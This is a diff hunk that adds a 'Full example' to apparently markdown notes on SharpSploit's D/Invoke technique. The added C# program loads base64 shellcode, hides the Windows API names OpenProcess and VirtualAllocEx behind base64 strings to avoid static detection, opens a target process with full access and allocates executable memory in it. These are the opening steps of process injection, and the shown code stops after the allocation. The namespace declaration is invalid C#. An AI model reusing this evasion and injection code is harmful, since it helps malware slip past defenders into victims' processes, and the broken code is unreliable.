@@ -228,6 +228,50 @@ string opdec = Encoding.UTF8.GetString(openc);
 var pointer = Generic.GetLibraryAddress("kernel32.dll", opdec);
 ```
 
+#### Full example 
+
+using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Text;
+using SharpSploit.Execution.DynamicInvoke;
+
+namespace testing D/Invoke
+{   class Program
+    {
+        static void Main(string[] args)
+        {
+            var b64_sc = File.ReadAllText(args[0]);
+            Console.WriteLine("[+] Read {0} bytes", b64_sc.Length);
+            var sc = System.Convert.FromBase64String(b64_sc);
+            Console.WriteLine("[+] Decoded it into {0} bytes", sc.Length);
+
+            string op = "T3BlblByb2Nlc3M="; // echo -n "API_NAME" | base64
+            byte[] openc = System.Convert.FromBase64String(op);
+            string opdec = Encoding.UTF8.GetString(openc);
+            var pointer = Generic.GetLibraryAddress("kernel32.dll", opdec);
+            var OpPr = Marshal.GetDelegateForFunctionPointer(pointer, typeof(OpPr)) as OpPr;
+            var hProcess = OpPr(0x001F0FFF, false, int.Parse(args[1]));
+            Console.WriteLine("[+] hProcess: 0x" + string.Format("{0:X}", hProcess.ToInt64()));
+
+            string va = "VmlydHVhbEFsbG9jRXg=";
+            byte[] vaenc = System.Convert.FromBase64String(va);
+            string vadec = Encoding.UTF8.GetString(vaenc);
+            pointer = Generic.GetLibraryAddress("kernel32.dll", vadec);
+            var VAx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(VAx)) as VAx;
+            var alloc = VAx(hProcess, IntPtr.Zero, (uint)sc.Length, 0x1000 | 0x2000, 0x40);
+            Console.WriteLine("[+] Allocated: " + string.Format("{0}", alloc.ToInt64()));
+
+        }
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        delegate IntPtr OpPr(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr VAx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+    }
+}
 
 
 
